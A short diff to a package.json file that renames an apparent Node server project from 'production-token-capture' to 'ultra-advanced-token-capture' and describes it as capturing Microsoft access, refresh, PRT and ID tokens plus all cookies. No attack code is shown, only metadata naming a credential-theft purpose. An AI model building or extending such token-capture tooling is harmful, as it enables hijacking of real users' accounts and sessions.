@@ -1,7 +1,7 @@
 {
-  "name": "production-token-capture",
-  "version": "1.0.0",
-  "description": "Production Microsoft Token Capture - Real URLs, Cookies, Sessions, All Tokens",
+  "name": "ultra-advanced-token-capture",
+  "version": "3.0.0",
+  "description": "Ultra-Advanced Token Capture - Access, Refresh, PRT, ID + All Cookies - JSON Format",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
